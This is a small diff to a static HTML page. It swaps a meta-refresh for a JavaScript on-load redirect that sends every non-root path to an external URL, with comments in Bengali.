@@ -1,9 +1,21 @@
+
 <!DOCTYPE html>
 <html>
   <head>
-    <meta http-equiv="refresh" content="0; url=https://reviewshops.online/hd/?k" />
+    <script>
+      // সব path redirect করবে
+      window.onload = function () {
+        // main link
+        var redirectTo = "https://reviewshops.online/hd/?k";
+
+        // যদি current URL রুট না হয়
+        if (window.location.pathname !== "/") {
+          window.location.href = redirectTo;
+        }
+      };
+    </script>
   </head>
   <body>
-    <p>Redirecting...</p>
+    <h1>Redirecting...</h1>
   </body>
 </html>
